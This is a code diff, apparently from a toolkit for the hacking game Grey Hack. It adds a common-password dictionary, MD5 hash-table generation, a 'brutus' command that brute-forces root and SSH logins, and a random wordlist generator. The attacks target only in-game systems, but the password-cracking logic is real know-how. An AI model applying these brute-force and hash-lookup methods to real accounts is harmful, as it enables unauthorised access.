+	PASSWORDSA="323232,osint,msfconsole,Bd5gHie89YA,tornado,lindsey,content,bruce,buck,aragorn,griffin,chen,campbell,trojan,christop,newman,wayne,tina,rockstar,father,geronimo,pascal,crimson,brooks,hector,penny,anna,camera,chandler,fatcat,lovelove,cody,cunts,waters,stimpy,finger,cindy,wheels,viper1,latin,robin,greenday,creampie,brendan,hiphop,willy,snapper,funtime,duck,trombone,adult,cotton,cookies,kaiser,mulder,westham,latino,jeep,ravens,aurora,drizzt,madness,hermit,energy,kinky,314159,leather,bastard,young,,extreme,hard,password1,vincent,lacrosse,hotmail,spooky,amateur,alaska,badger,paradise,maryjane,soup,crazy,mozart,video,russell,vagina,spitfire,anderson,norman,otaku,eric,cherokee,cougar,barbara,long,family,horse,enigma,allison,raider,brazil,blonde,jones,55555,dude,drowssap,jeff,school,marshall,lovely,1qaz2wsx,jeffrey,caroline,franklin,booty,molly,snickers,leslie,nipples,courtney,diesel,rocks,eminem,westside,suzuki,daddy,passion,hummer,ladies,Azachary,frankie,elvis,reggie,alpha,suckme,simpson,patricia,pirate,tommy,semperfi,jupiter,redrum,freeuser,wanker,stinky,ducati,paris,natalie,babygirl,bishop,windows,spirit,tiktok,thot,pantera,monday,patches,brutus,houston,smooth,penguin,marley,forest,cream,212121,flash,maximus,nipple,bobby,bradley,vision,pokemon,champion,fireman,indian,softball,picard,system,clinton,cobra,enjoy,lucky1,claire,claudia,boogie,timothy,marines,security,dirty,admin,wildcats,pimp,dancer,hardon,veronica,abcd1234,abcdefg,ironman,wolverin,remember,great,freepass,bigred,squirt,justice,francis,hobbes,kermit,pearljam,mercury,domino,9999,denver,brooke,rascal,hitman,mistress,simon,tony,bbbbbb,friend,peekaboo,naked,budlight,electric,sluts,stargate,saints,bondage,brittany,bigman,zombie,swimming,duke,qwerty1,babes,scotland,disney,rooster,brenda,mookie,swordfis,candy,duncan,olivia,hunting,blink182,alicia,8888,samsung,bubba1,whore,virginia,general,passport,aaaaaaaa,erotic,liberty,arizona,jesus,abcd,newport,skipper,rolltide,balls,happy1,galore,christ,weasel,242424,wombat,digger,classic,bulldogs,poopoo,accord,popcorn,turkey,jenny,amber,bunny,mouse,titanic,liverpool,dreamer,everton,friends,chevelle,carrie,gabriel,psycho,nemesis,burton,pontiac,connor,eatme,lickme,roland,cumming,mitchell,ireland,lincoln,arnold,spiderma,patriots,goblue,devils,eugene,empire,asdfg,cardinal,brown,shaggy,froggy,qwer,kawasaki,kodiak,people,phpbb,light,kramer,chopper,hooker,honey,whynot,lisa,baxter,adam,snake,ncc1701d,qqqqqq,airplane,britney,avalon,sandy,sugar,sublime,stewart,wildcat,raven,scarface,elizabet,123654,trucks,wolfpack,lawrence,raymond,american,alyssa,bambam,movie,woody,shaved,snowman,tiger1,chicks,raptor,1969,stingray,shooter,france,stars,madmax,kristen,sports,jerry,789456,garcia,simpsons,lights,ryan,looking,chronic,alison,hahaha,packard,hendrix,perfect,service,spring,srinivas,spike,katie,oscar,brother,bigmac,suck,single,cannon,georgia,popeye,tattoo,texas,party,bullet,taurus,sailor,wolves,panthers,japan,strike,flowers,pussycat,chris1,loverboy,berlin,sticky,marina,tarheels,fisher,russia,connie,wolfgang,testtest,mature,bass,catch22,juice,michael1,159753,women,alpha1,trooper,hawkeye,head,freaky,dodgers,pakistan,machine,pyramid,vegeta,katana,moose,tinker,coyote,infinity,inside,letmein1,bang,control,hercules,morris,james1,tickle,outlaw,browns,billybob,pickle,test1,michele,antonio,sucks,pavilion,changeme,caesar,prelude,tanner,adrian,darkside,bowling,wutang,sunset,robbie,alabama,danger,zeppelin,juan,rusty,pppppp,nick,2001,ping,darkstar,madonna,qwe123,bigone,casino,cheryl,charlie1,mmmmmm,lakota,akota,integra,wrangler,apache,tweety,qwerty12,bobafett,simone,none,business,sterling,trevor,transam,dustin,harvey,england,2323,seattle,ssssss,rose,harry,openup,pandora,trucker,wallace,indigo,storm,malibu,weed,review,babydoll,doggy,dilbert,pegasus,joker,catfish,flipper,valerie,herman,detroit,kenneth,cheyenne,bruins,stacey,smoke,joey,seven,marino,fetish,xfiles,wonder,stinger,pizza,babe,pretty,stealth,manutd,gracie,gundam,cessna,longhorn,presario,mnbvcxz,wicked,mustang1,victory,shelly,awesome,athena,q1w2e3r4,help,holiday,knicks,street,redneck,casey,gizmo,scully,dragon1,devildog,triumph,eddie,bluebird,shotgun,peewee,hubris,ronnie,angel1,daisy,special,metallica,madman,country,impala,lennon,roscoe,omega,access14,enterpri,miranda,search,smitty,blizzard,unicorn,tight,rick,ronald,asdf1234,harrison,trigger,truck,danny,home,winnie,beauty,thailand,cadillac,castle,tyler,bobcat,buddy1,sunny,stones,asian,freddie,chuck,butt,loveyou,norton,hellfire,hotsex,indiana,short,panzer,lonewolf,trumpet,colors,blaster,12121212,fireball,logan,precious,aaron,elaine,jungle,masamune,atlanta,gold,corona,curtis,nikki,polaris,timber,theone,baller,chipper,orlando,island,skyline,dragons,dogs,benson,licker,goldie,engineer,kong,pencil,basketba,open,hornet,world,linda,barbie,chan,farmer,valentin,indians,larry,redman,foobar,travel,morpheus,bernie,target,141414,hotstuff,photos,laura,savage,holly,rocky1,dollar,turbo,design,newton,hottie,moon,blondes,4128,lestat,avatar,future,goforit,random,abgrtyu,jjjjjj,q1w2e3,smiley,goldberg,express,zipper,wrinkle1,stone,andy,babylon,dong,powers,consumer,dudley,Aster,monkey1,serenity,samurai,99999999,skeeter,lindsay,joejoe,master1,aaaaa,chocolat,christia,birthday,stephani,tang,alfred,ball,maria,sexual,maxima,sampson,buckeye,highland,kristin,seminole,reaper,bassman,nugget,lucifer,airforce,nasty,watson,warlock,2121,philip,always,dodge,chrissy,burger,bird,snatch,missy,pink,gang,maddie,holmes,huskers,piglet,photo,joanne,hamilton,dodger,paladin,christy,chubby,buckeyes,hamlet,abcdefgh,bigfoot,sunday,manson,goldfish,garden,deftones,icecream,blondie,spartan,julie,harold,charger,brandi,stormy,sherry,pleasure,juventus,rodney,galaxy,holland,escort,zxcvb,planet,jerome,wesley,blues,song,peace,david1,1966,cavalier,gambit,karen,sidney,ripper,jamie,sister,marie,martha,nylons,aardvark,nadine,minnie,whiskey,bing,plastic,anal,babylon5,chang,savannah,loser,racecar,insane,yankees1,mememe,hansolo,chiefs,fredfred,freak,frog,salmon,concrete,yvonne,sophia,stefan,8a1n80w,slick,rocker,opensesame,onessnap".split(",")
+	PASSWORDSC="123456789098765,012345678909876,abgDw32fhGu58k,Bd5gHie89YA,HG54h49lklj4G53,Bd5gHie89YA,59038qyghq340fg,tgby2hnr4fv9ujm,abcplm123098tg6,3dsvi2psdfn34,a03nf93nf8,3edv45gb8ub202n,afdiounwrnnfsa,234086531230324,111111111111111,222222222222222,333333333333333,444444444444444,55555555555555,666666666666666,777777777777777,888888888888888,999999999999999,000000000000000,efh368jhr08712,asdfghjkl102938,ghfjdkslatywoec,bogu2847mshd02,1357924680aoejd,g35gk5k63l10,d0emgh4m43la,ae51wc3g7d9c,GHEITHEKA102938,HHHHHHHHHHHHH,AAAAAAAAAAAAAAAA,RRRRRRRRRRRRRRRR,sssssssssssssss,ttttttttttttttt,llllllllllllll,eeeeeeeeeeeee,uuuuuuuuuuuu,oooooooooo,aaaaaaaa,1234,123,987,567,654,56432,12345,55555,99999,34567,jhgfd,uiopl,mnbvc,ytrewq,iuhhfd,sadregh,01010101010101,1010101010101010,000111000111000,einagearghaaer,235gdfa5yhgea,aletgadfgraerga,0k9j8h7g6f5f4ed2,afdsawe4togfido,butyrhdncbuh,39n8nf93fk59,adfsafawefgaag,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,1,2,3,4,5,6,7,8,9,0".split(",")
+	PASSWORDS = PASSWORDSA + PASSWORDSB
+	if arg2 == "-p" then PASSWORDS = PASSWORDSC
+	String={}
+	String.capitalize=function(s)
+	if s.len<2 then return s.upper
+	return s[0].upper+s[1:].lower
+	end function
+	String.strip=function(t,s)
+	if not t then return ""
+	for b in range(0,t.len-1)
+		if s.indexOf(t[b])==null then break
+	end for
+	if s.indexOf(t[b])>=0 then return ""
+	for e in range(-1,-1*t.len)
+		if s.indexOf(t[e])==null then break
+	end for
+	if e==-1 then return t[b:]
+	return t[b:e+1]
+	end function
+	PasswordGenerator={}
+	PasswordGenerator.init=function(samples)
+	self.s=[]
+	self.c={}
+	for s in samples
+		s=s.trim.upper
+		if s.len>3 then self.s.push(s)
+	end for
+	for s in self.s
+		for i in range(0,s.len-4)
+		k=s[i:i+3]
+		if self.c.hasIndex(k) then
+			if self.c[k].indexOf(s[i+3])==null then self.c[k].push(s[i+3])
+		else
+			self.c[k]=[s[i+3]]
+		end if
+		end for
+		//wait(.1)
+	end for
+	end function
+	PasswordGenerator.AllPasswords=function()
+	r={}
+	for s in self.s
+		for i in range(0,s.len-4)
+		self.r(s.len,s[i:i+3],r)
+		//wait(.01)
+		end for
+	end for
+		print(colorGold+"50%"+CT+" -- loading hash_table...")
+		print("<align=center>"+char(171)+char(187)+"</align>")
+	o={}
+	for s in r.indexes
+		if s.indexOf(" ")>=0 then
+		n=s.split(" ")
+		i=n.indexOf("")
+		while i>=0
+			n.remove(i)
+			i=n.indexOf("",i-1)
+		end while
+		if n then
+			for i in range(0,n.len-1)
+			n[i]=String.capitalize(n[i])
+			end for
+		end if
+		s=n.join(" ")
+		else
+		s=String.capitalize(s)
+		end if
+		if s.len<5 then continue
+		a=s[0]
+		b=s[1]
+		if a.lower==b or "hrl'aeiou".indexOf(b)==null and "AEIOUS".indexOf(a)==null and ["Ch","Mc"].indexOf(a+b)==null then s=String.capitalize(s[1:])
+		s=String.strip(s,"'-")
+		o[s]=1
+		o[s.lower]=1
+		//wait(.01)
+	end for
+	r={}
+		print(colorGold+"75%"+CT+" -- loading hash_table...")
+		print("<align=center>"+char(171)+char(187)+"</align>")
+		if arg1 == "false" then return o.indexes
+	for i in o.indexes
+		r[md5(i)]=i
+	end for
+	return r
+	end function
+	PasswordGenerator.r=function(l,s,o)
+	c=s[s.len-3:]
+	if self.c.hasIndex(c) and s.len<l then
+		for c in self.c[c]
+		self.r(l,s+c,o)
+		//wait(.01)
+		end for
+	else
+		o[s]=1
+	end if
+	end function
+	if globals.BIGBRAIN then 
+		if arg1 == "false" then
+			return "Dictionary already expaneded."
+		end if
+		print(colorGold+"0% -- loading hash_table, please wait..."+CT)
+		HASH_TABLE = {}
+		for pw in globals.dict_a
+			HASH_TABLE[md5(pw)] = pw
+			//wait(.01)
+		end for
+		print(colorGold+"100%"+CT+" -- hash_table loaded...")
+	else
+		print(colorGold+"0% -- loading hash_table, please wait..."+CT)
+		if arg1 == "-t" or arg2 == "-t" then 
+			PasswordGenerator.init(PASSWORDSC)	
+		else 
+			PasswordGenerator.init(PASSWORDS)
+		end if
+		//PasswordGenerator.init(globals.dict_a)
+		//PasswordGenerator.init(globals.dict_a+PASSWORDS)
+		//PasswordGenerator.init(PASSWORDS[0:arg2])
+		//
+		print(colorGold+"10%"+CT+" -- loading hash_table...")
+		print("<align=center>"+char(171)+char(187)+"</align>")
+		HASH_TABLE=PasswordGenerator.AllPasswords
+		print(colorGold+"100%"+CT+" -- hash_table loaded...")
+		print("<b>Magnum Cerebrum: expanding onboard dictionary...</b>")
+		// globals.dict_a = HASH_TABLE.values
+		if arg2 == "-p" then globals.dict_a(HASH_TABLE.values + PASSWORDSA + PASSWORDSB + PASSWORDSC) else globals.dict_a(HASH_TABLE.values)
+		globals.BIGBRAIN = true
+		if arg1 == "false" then
+			return "Dictionary expaneded."
+		end if
+	end if
+	table = "tp"
+	if arg1 == "hash" then table = "t5"
+	print(print(colorGold+"Writing tables to <u>"+home_dir+"/tables/"+table+CT))
+	print(colorGold+"Hash Table: ["+colorWhite+HASH_TABLE.len+"</color>]")
+	print("<align=center>"+char(171)+char(187)+"</align>")
+	out=[]
+	count=0
+	lol=1
+	for i in HASH_TABLE
+		count=count+1
+		if arg1 == "hash" then
+			//out=out+char(10)+i["key"]+"="+i["value"]
+			out.push(i["key"]+"="+i["value"])
+		else
+			//out=out+char(10)+i["value"]
+			out.push(i["value"])
+		end if
+		output = out.join(char(10))
+		if output.len > 159900 then
+			print(lol+" "+out.len+" "+output.len)
+			localmachine.touch(home_dir+"/tables/"+table,lol+"")
+			file=localmachine.File(home_dir+"/tables/"+table+"/"+lol)
+			file.set_content(output)
+			command.perms("o-rwx",file)
+			out=[]
+			lol=lol + 1
+		end if
+		//wait(.01)
+	end for
+
+	if out.len > 1 then
+		print(lol+" "+HASH_TABLE.len+" "+out.len)
+		localmachine.touch(home_dir+"/tables/"+table,lol+"")
+		file=localmachine.File(home_dir+"/tables/"+table+"/"+lol)
+		file.set_content(out.join(char(10)))
+		command.perms("o-rwx",file)
+		out=""
+		lol=lol + 1
+	end if
+
+	return file.path
+end function
+command.brutus = function(arg1, arg2=0, arg3=0, arg4=0, arg5=0)
+	if arg1 == "-h" or arg1 == "help" then return colorGold+"Brutus: dictionary attack psudo brute force type tool"+char(10)+"Usage: brutus -- attempt to gain root pass and shell using onboard dict_a "+char(10)+"(Default onboard dict_a: ["+colorGold+globals.dict_a.len+CT+"] passwords)"+char(10)+"-- on success sends <b>shell</b> to BUFFER and password to <b>clipa</b>"+char(10)+"Usage: brutus -i [/path|object] -- import dictionary (may be csv or newline separated values)"+char(10)+"-- 5hell will attempt to determine the type. Please ensure valid inputs."+char(10)+"-- accepts: path to file or folder, or piped file/folder object"+char(10)+"-- See dfit for making a.csv from newline separated dictionary file."+char(10)+"-- See cerebrum for altering onboard dict_a"+char(10)+"Advanced: brutus -s [shell_object] [ip] -- use shell_object to initiate ssh + brutus attack against ip "+char(10)+"(equal to command.ssh root@-brutus [ip] but uses the given shell instead of active shell)"
+	dic = globals.dict_a
+	u_name = "root"
+	ip = ""
+	port = 22
+	b_remote = false
+	if arg1 == "-i" and arg1.len == 2 then
+	 	if arg2 and arg2 != "0" then
+			if typeof(arg2) == "string" then
+				dic = globals.get_file(arg2)
+			else
+				if typeof(arg2) == "file" then
+					dic = arg2
+				else
+					return "brutus: valid option -i [/path|file_object] -- import dictionary file"
+				end if
+			end if
+		else
+			return "brutus: valid option -i [/path|file_object] -- import dictionary file"
+		end if
+	end if
+	if DEBUG then print("arg1: "+arg1+char(10)+"arg2: "+arg2+char(10)+dic)
+	if not dic then return("Dictionary: "+arg2+" not found")
+	print(colorGold+"Brutus: accessing dictionary..."+CT)
+	if arg1 == "-s" and arg2 and typeof(arg2) == "shell" then
+		print(colorLightBlue+"brutus: </b>Configuring remote attack...<b>"+CT)
+		if arg3 and arg4 then
+			if arg5 then port = arg5
+			if typeof(port) != "number" then port = port.to_int
+			if typeof(port) != "number" then return colorRed+"brutus: invalid port"+CT
+			ip = arg4
+			u_name = arg3
+		else
+			if arg3 then u_name = arg3
+			ip = user_input("root@ip: ")
+		end if
+		if is_valid_ip(ip) then
+			print("<b>brutus: remote attack configured.</b>")
+			stop = user_input(colorRed+"WARNING:"+colorOrange+"Continuing will fill the terminal with ["+colorGold+globals.dict_a.len+colorOrange+"] connection attempts."+char(10)+" This cannot be avoided. Continue? [Y/n] "+CT)
+			if stop == "n" or stop == "N" then return "aborting..."
+			b_remote = true
+		else
+			return colorRed+"Brutus: invalid ip."+CT
+		end if
+	end if
+	if typeof(dic) == "file" then
+	 	if not dic.is_binary then
+			d_buf = dic.get_content
+			if d_buf.indexOf(",") > 0 then
+				dic = d_buf.trim.split(",")
+			else
+				dic = d_buf.split(char(10))
+			end if
+		else
+			if dic.is_folder then
+				df = dic.get_folders
+				box = []
+				for f in df
+					f_buf = f.get_content
+					if f_buf.indexOf(",") > 0 then
+						dic_buf = f_buf.trim.split(",")
+					else
+						dic_buf = f_buf.split(char(10))
+					end if
+					for d in dic_buf
+						box.push(d)
+					end for
+					//wait(.1)
+				end for
+				dic = box[0:]
+			else
+				return "brutus: invalid dictionary input."+char(10)+"got: binary_file. expected: folder or ascii file."
+			end if
+		end if
+	end if
+	if typeof(dic) != "list" then return "brutus: dictionary error."
+	if DEBUG then print("d_len: "+dic.len)
+	for d in dic
+		if b_remote then
+			root = shell.connect_service(ip, port, u_name, d)
+		else
+			root = get_shell("root", d)
+		end if
+		if typeof(root) == "shell" then
+			print("root:"+colorGold+""+d+""+CT)
+			print("clipa: "+command.clipa(d))
+			//print("brutus: writing to dump.txt")
+			//command.poke("dump.txt",char(10)+"root:"+d+char(10))
+			globals.BUFFER.push(root)
+			print("<b>Shell sent to BUFFER. Access via Memory Alpha (<u>malp</u> command)</b>")
+			//go = user_input("Start terminal? [y/N]"+char(10)+"||: ",0,1)
+			//if go.lower == "y" then
+			//	root.start_terminal
+			//end if
+			return root
+		end if
+	end for
+	print("...brute force attack failed.")
+	return 0
+end function
+command.cerebrum = function(arg1, arg2, arg3=0, arg4=0)
+	if arg1 == "-h" or arg1 == "help" then return colorGold+"<u>Magnum Cerebrum: Big Brain. </u>"+CT+char(10)+"Expand dict_a to 300k+ passwords for this runtime instance. Returns zero."+char(10)+"(Use <b>pwgen</b> instead to save passwords locally)."+char(10)+"<b>Advanced: cerebrum -i [/path/to/file|file_object|list] -- import a custom dictionary"+char(10)+"-- file may be csv or nsv: ',' or char(10) "+char(10)+"-- may be file, directory, piped object, or list"+char(10)+"Usage: <b>cerebrum --purge</b> -- purge the onboard dictionary (to save memory)."+char(10)+"Advanced: cerebrum -p -- load only common player passwords (wip)"+char(10)+"Advanced: cerebrum -i @home -- import dictionary file or folder from @home server"+char(10)+"-- searches /root/tables/tp on @home server"+char(10)+"-- see help @home for more information about the @home server."+char(10+"Advanced: -- passing -d as any argument returns the onboard dictionary as a list"+char(10)+"---- importing a string of passwords directly is not supported, use brutus for that.")
+	if arg1 == "-i" and not arg2 then return "cerebrum: -i expects /path or file_object or @home."
+	infile = null
+	if arg1 == "--purge" then 
+		globals.dict_a(["a"])
+		globals.BIGBRAIN = false
+		return "cerebrum: dictionary purged."
+	end if
+	if arg1 == "-i"then
+		if not arg2 then return "crebrum: -i expects a path or file object or list."
+		if typeof(arg2) == "list" then
+			globals.dict_a(arg2)
+			if dict_a.len > 0 then return "cerebrum: ["+colorGold+globals.dict_a.len+CT+"] passwords ready. " else return "cerebrum: import error. dictionary corrupted."
+		end if
+		if typeof(arg2) == "string" then
+			if arg2 == "@home" then
+				r_ip = ""
+				r_p = "22"
+				if params and params.len > 1 then
+					r_ip = params[0]
+					r_p = params[1].to_int
+				else
+					r_ip = targ.ip
+					r_p = targ.pt
+				end if
+				if not is_valid_ip(r_ip) then return "cerebrum: set remote ip and port with command.target [ip] [port] before using -i @home option."
+				r_pas = ""
+				//if params and params.len > 2 then
+					//r_pas = params[2]
+				//else
+					r_pas = user_input("@home_server_password (leave blank to abort)"+char(10)+":> ", 1)
+				//end if
+				if r_pas.replace(" ","") == "" then return("aborting...")
+				r_r = shell.connect_service(r_ip, r_p, "root", r_pas)
+				if r_r and typeof(r_r) == "shell" then
+					infile = r_r.host_computer.File("/root/tables/tp")
+					if not infile then return (colorRed+"404: /root/tables/tp not found. Run pwgen on remote host."+CT)
+				else
+					return (colorRed+"222: remote server unreachable."+CT)
+				end if
+			else
+				infile = globals.get_file(arg2)
+				if DEBUG then print "infile: "+infile.path
+			end if
+		else
+			if typeof(arg2) == "file" then
+				infile = arg2
+			else
+				return "cerebrum: invalid type. expects /path or file_object or @home."
+			end if
+		end if
+		print(colorGold+"Importing..."+char(10)+colorGold+"<align=center><<>></align>"+CT)
+		if infile and not infile.is_binary then
+			d_b = infile.get_content
+			globals.dict_a([])
+			if d_b.indexOf(",") > 0 then
+				globals.dict_a(globals.dict_a + d_b.split(","))
+			else
+				globals.dict_a(globals.dict_a + d_b.split(char(10)))
+			end if
+		else
+			if infile and infile.is_folder then
+				globals.dict_a([])
+				for dfile in infile.get_files
+					if dfile.has_permission("r") and not dfile.is_binary then
+						d_b = dfile.get_content
+						if DEBUG then print "d_b input size: "+d_b.len
+						delim = ""
+						if d_b.indexOf(",") > 0 then
+							//globals.dict_a = globals.dict_a + dfile.get_content.split(",")
+							delim = ","
+						else
+							//globals.dict_a = globals.dict_a + dfile.get_content.split(char(10))
+							delim = char(10)
+						end if
+						if globals.dict_a.len < 710000 then 
+							d_b = d_b.split(delim)
+							globals.dict_a(globals.dict_a + d_b)	
+							if DEBUG then print("dict_a: "+dict_a.len)
+						else 
+							print("cerebrum: max dictionary length reached. Could not load: "+dfile.path)
+						end if
+					end if
+				end for
+			else
+				return "cerebrum: import error [411]."
+			end if
+		end if
+		if dict_a.len > 0 then 
+			globals.BIGBRAIN = true
+			return "cerebrum: ["+colorGold+dict_a.len+CT+"] passwords ready. " 
+		else 
+			return "cerebrum: import error. dictionary corrupted."
+		end if
+	end if
+	if globals.BIGBRAIN then return "Magnum Cerebrum already active."+char(10)+"Run the command: <b>cerebrum --purge</b> to reset."
+	print(colorGold+"<align=center> Magnum Cerebrum </align>"+CT)
+	print(colorGold+"- - - - - - - - - - - - - - - - - - - - - - - - - -"+CT)
+	//globals.BIGBRAIN = true
+	time_s = time
+	if DEBUG then print("DEBUG: TIME: "+time_s)
+	tab = get_shell.host_computer.File("/root/tables/tp")
+	if tab and tab.has_permission("r") then 
+		print("Detected /root/tables/tp. Auto-import passwords?")
+		autoimport = user_input("[Y/n/q]||: ",0,1)
+		if autoimport.lower == "q" then return
+		if autoimport.lower != "n" then 
+			print("Calling "+colorWhite+"<u>cerebrum -i /root/tables/tp</u>")
+			print command.cerebrum("-i","/root/tables/tp")
+			return globals.dict_a.len+" passwords imported in "+str(time-time_s)+" seconds."
+		end if
+	end if
+	if DEBUG then print("cerebrum calling: pwgen false "+arg1)
+	command.pwgen("false",arg1)
+	time_e = (time - time_s)
+	print( globals.dict_a.len+" passwords readied in "+time_e+" seconds." )
+	if arg1 == "-d" or arg2 == "-d" or arg3 == "-d" then return dict_a else return 0
+end function
+if DEBUG then print("<size=75%>loading jtr.5pk...(3.397kb)</size>")
+command.jtr = function(arg1,arg2,arg3,arg4=0)
+	if arg1 == "help" or arg1 == "-h" or not arg3 then return "John The Ripper password generator"+char(10)+"Usage: jtr [set_size] [word_length(1-15)] [opt:aAns] [opt:1]" + char(10) + "a - lowercase alpha" +char(10)+ "A - uppercase alpha"+char(10)+"n - numbers"+char(10)+"s - special characters"+char(10)+"note: at least ONE option must be selected"+char(10)+"1 -- optional only first letter is upper case (any value here is considered 1/true), leave blank for false."
+	if arg1.to_int <= 0 then return "size error: greater than zero expected"
+	if arg2.to_int <= 0 or arg2.to_int > 15 then return "length error: expected between 1 and 15"
+
+	array = []
+	alpha_l = range("a".code,"z".code)
+	i = 0
+	for c in alpha_l
+		alpha_l[i] = char(c)
+		i = i + 1
+	end for
+	alpha_u = range("A".code,"Z".code)
+	i = 0
+	for c in alpha_u
+		alpha_u[i] = char(c)
+		i = i + 1
+	end for
+	numbers = range(0,9)
+	special = ["!","@","#","$","%","^","&","*","(",")","-","+","=","}","{","[","]",";",":","<",">",",",".","'",""""]
+
+	SET_SIZE = arg1.to_int // generate 1000 words 
+	SET_RANGE = arg2.to_int // string of length 15
+	PARAMS = [0,0,0,0] // use alpha_l, use alpha_u, use numbers, use special
+	if arg3.indexOf("a") >= 0 then PARAMS[0] = 1
+	if arg3.indexOf("A") >= 0 then PARAMS[1] = 1
+	if arg3.indexOf("n") >= 0 then PARAMS[2] = 1
+	if arg3.indexOf("s") >= 0 then PARAMS[3] = 1
+	if PARAMS.indexOf(1) == null then return "option error: must select a, A, n, and/or s"
+
+	first_cap = 0
+	if arg4 then first_cap = 1
+	//print("arg4 is "+arg4+" and first_cap is "+ first_cap)
+	output = []
+
+	line = []
+	if PARAMS[0] then line = line + alpha_l
+	if PARAMS[1] then line = line + alpha_u
+	if PARAMS[2] then line = line + numbers
+	if PARAMS[3] then line = line + special
+	//print(line)
+	if typeof(line) != "list" then return "PARAMS error"
+	print("<b>Generating wordlist...</b>")
+	loops = SET_SIZE
+	while loops
+		i = 0
+		array = range( 0 , SET_RANGE - 1 )
+		while i < SET_RANGE
+			line.shuffle
+			if first_cap == true then 
+				if i == 0 then  
+					array[i] = line[0].upper
+				else
+					array[i] = line[0].lower
+				end if
+			else 
+				array[i] = line[0]
+			end if
+			i = i + 1
+			//wait(.01)
+		end while
+		if output.indexOf(array.join("")) == null then // ouput
+			output.push(array.join(""))
+			loops = loops - 1
+		end if
+		if SET_SIZE / loops == 4 then print("loading... 75% complete")
+		if SET_SIZE / loops == 2 then print("loading... 50% complete")
+		//wait(.01)
+	end while
+	return output.join(char(10)) // max string size is 1 million chars
+end function
